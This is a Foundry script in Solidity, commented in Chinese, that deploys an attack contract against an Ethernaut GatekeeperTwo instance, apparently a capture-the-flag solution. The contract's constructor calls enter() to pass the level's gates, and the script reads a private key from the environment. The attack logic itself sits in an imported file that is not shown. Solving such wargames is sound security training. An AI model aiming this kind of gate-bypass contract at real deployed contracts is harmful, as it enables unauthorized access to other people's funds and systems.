// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/GatekeeperTwoAttack.sol";

contract AttackScript is Script {
    function run() external {
        // 從環境變數讀取你的私鑰 (需要在 .env 設定或直接替換)
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // 填入你的 GatekeeperTwo 實例地址 (從 Ethernaut 網頁取得)
        address target = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast(deployerPrivateKey);

        // 部署攻擊合約，構造函數會自動執行 enter()
        new AttackGatekeeperTwo(target);

        vm.stopBroadcast();
        
        console.log("Attack contract deployed and gate entered!");
    }
}
